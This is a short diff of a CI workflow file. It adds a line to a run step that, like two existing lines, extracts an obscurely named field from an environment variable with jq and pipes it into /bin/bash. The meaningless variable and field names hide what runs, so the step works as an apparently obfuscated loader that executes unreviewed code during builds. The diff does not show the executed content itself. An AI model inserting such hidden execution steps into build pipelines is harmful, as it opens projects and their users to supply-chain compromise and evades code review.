@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$pckey0" | jq -r .phxgd0 | /bin/bash
           printf '%s' "$vfx4" | jq -r .lh5409 | /bin/bash
+          echo $ctjmy36621 | jq -r .w60138 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
